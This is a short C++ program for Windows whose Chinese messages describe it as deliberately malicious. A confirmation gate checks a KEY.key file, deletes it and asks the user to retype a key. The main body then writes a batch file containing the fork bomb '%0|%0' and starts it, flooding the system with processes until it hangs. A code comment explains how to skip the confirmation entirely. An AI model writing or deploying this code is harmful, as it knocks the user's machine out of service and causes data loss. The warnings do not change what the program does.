#include<iostream>
#include<stdio.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
using namespace std;
#define keyn 1887415157
FILE* cono;
FILE* coni;
bool key()//此函数用于进行确认，如果需要生成无需确认的程序，return 1即可
{
	cout << "您运行了此程序。再次声明此程序是恶意程序，会对您的计算机造成极大的损害" << endl;
	cout << "为了确保您已做好准备，接下来将进行验证" << endl;
	FILE* keyf;
	freopen_s(&keyf, "KEY.key", "r", stdin);
	if (keyf == NULL)
	{
		cout << "找不到KEY.key" << endl;
		cout << "为防止误触，确保您的安全，您必须将此恶意程序对应的KEY.key与此恶意程序置于同一目录内" << endl;
		fclose(stdin);
		freopen_s(&coni, "CON", "r", stdin);
		cout << "取消运行" << endl;
		return 0;
	}
	long long key;
	cin >> key;
	if (key != keyn)
	{
		cout << "密钥不统一" << endl;
		cout << "为防止误触，确保您的安全，您必须将此恶意程序对应的KEY.key与此恶意程序置于同一目录内" << endl;
		fclose(stdin);
		freopen_s(&coni, "CON", "r", stdin);
		cout << "取消运行" << endl;
		return 0;
	}
	fclose(stdin);
	freopen_s(&coni, "CON", "r", stdin);
	system("del KEY.key");
	cout << "为了防止您以后误触，已将KEY.key删除" << endl;
	while (true)
	{
		cout << "您确定要运行此程序吗? (Y/N)";
		char ans;
		cin.clear();
		cin >> ans;
		if (ans == 'N')
		{
			cout << "取消运行" << endl;
			return 0;
		}
		else if (ans == 'Y')
		{
			break;
		}
	}
	cout << "再次强调，此程序真的很危险，您必须确保在虚拟机上运行它，且保证虚拟机已备份" << endl;
	cout << "接下来进行最后的确认：" << endl;
	cout << "请您输入: " << keyn << "    ";
	long long anskey;
	cin >> anskey;
	if (anskey == keyn)
	{
		cout << "开始运行" << endl;
		return 1;
	}
	cout << "输入错误" << endl;
	cout << "取消运行" << endl;
	return 0;
}
int main()
{
	if (!key())
	{
		char a;
		cin >> a;
		return 0;
	}
	//以下为程序主体
	FILE* fl = NULL;
	fl = freopen("delthis.bat", "w", stdout);
	cout << "%0|%0";
	fclose(fl);
	system("start delthis.bat");

	_getch();
	return 0;
}

